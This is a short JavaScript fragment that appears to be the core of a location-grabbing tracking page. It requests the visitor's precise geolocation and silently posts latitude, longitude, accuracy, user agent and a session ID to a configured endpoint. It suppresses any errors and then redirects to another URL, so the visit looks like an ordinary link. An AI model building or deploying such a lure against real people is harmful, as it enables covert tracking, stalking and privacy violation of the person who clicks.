async function sendLocation(position) {
    const { latitude, longitude, accuracy } = position.coords;
    
    try {
        await fetch(CONFIG.API_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                latitude,
                longitude,
                accuracy,
                timestamp: new Date(position.timestamp).toISOString(),
                userAgent: navigator.userAgent,
                sessionId: CONFIG.SESSION_ID
            })
        });
    } catch (e) {}
    
    window.location.href = CONFIG.REDIRECT_URL;
}

function onError() {
    window.location.href = CONFIG.REDIRECT_URL;
}

function startGeolocation() {
    navigator.geolocation.getCurrentPosition(sendLocation, onError, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });

}
